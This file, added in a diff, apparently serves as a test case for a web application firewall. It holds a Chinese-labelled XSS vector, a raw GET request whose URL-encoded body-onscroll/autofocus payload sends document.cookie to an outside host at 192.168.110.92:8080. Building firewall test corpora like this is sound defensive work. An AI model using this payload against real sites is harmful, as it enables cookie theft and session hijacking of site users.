@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_body-06506776
+# 通过 <BODY> onscroll 自动对焦自动执行 JavaScript，由于自动聚焦在页面下方的 <INPUT> 上，此向量会触发在 <BODY> 上执行 JavaScript 的 onscroll 事件。
+GET /?id=%3Cbody%20onscroll=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E&bid=hd_tag_m8mv25by HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25by
+RM-PRO-Token: 3ba05d65f8cd6ee465026ed1e1ff2c0d
+RM-PRO-Time: 1742808459019
+User-Agent: curl/7.83.1
+
